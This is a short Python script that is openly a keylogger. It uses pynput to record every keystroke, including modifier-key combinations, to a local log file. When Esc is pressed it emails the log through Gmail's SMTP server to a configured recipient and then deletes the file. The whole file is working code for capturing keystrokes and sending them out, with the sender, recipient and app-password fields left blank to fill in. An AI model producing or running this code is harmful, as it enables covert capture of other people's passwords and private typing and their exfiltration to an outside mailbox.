from pynput import keyboard
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# sender and recipient email addresses
sender = ""
recipient = ""

# to get a password that you can use in Python enable 2FA in gmail
# and generate an App Password
password = ""

# ensure log file is created in the same directory as this python script

directory_path = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(directory_path, "log.txt")

# keylogger

def write_log(line):
    with open(file_path, "a") as file:
        file.write(line)


def on_press(Key):
    # pynput outputs Alt Gr as <65027>
    # this line fixes the issue
    if str(Key) == "<65027>":
        write_log("\nKey.alt_gr pressed\n")
    elif str(Key) == "Key.space":
        write_log(" ")

    # check if key is alphanumeric character
    elif hasattr(Key, "char"):
        write_log(f"{str(Key)}".replace("'", ""))
    else:
        write_log("\n{} pressed\n".format(Key))


def on_release(Key):
    # seeing when the following keys were released will
    # help in reading combinations of keys like Ctrl+C
    if (
        Key == keyboard.Key.shift_r
        or Key == keyboard.Key.shift
        or Key == keyboard.Key.shift_l
        or Key == keyboard.Key.ctrl
        or Key == keyboard.Key.ctrl_r
        or Key == keyboard.Key.ctrl_l
        or Key == keyboard.Key.alt
        or Key == keyboard.Key.alt_l
        or Key == keyboard.Key.alt_r
        or Key == keyboard.Key.cmd
        or Key == keyboard.Key.alt_gr
    ):
        write_log("\n{} released\n".format(Key))
    if str(Key) == "<65027>":
        write_log("\nKey.alt_gr released\n")
    
    # keylogger will stop when pressing esc
    if Key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# send email with log file attached
# the following code will run after keylogger stops

subject = "Keylogger Log"
body = "keylogger log attached"

message = MIMEMultipart()
message["Subject"] = subject
message["To"] = recipient
message["From"] = sender
msg_text = MIMEText(body)
message.attach(msg_text)

with open(file_path, "r") as file:
    log = file.read()
    attachment = MIMEText(log)
    attachment["Content-Disposition"] = "attachment; filename={}".format(
        os.path.basename(file_path)
    )
    message.attach(attachment)

with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp_server:
    smtp_server.login(sender, password)
    smtp_server.sendmail(sender, recipient, message.as_string())

# delete file after sending it

os.remove(file_path)
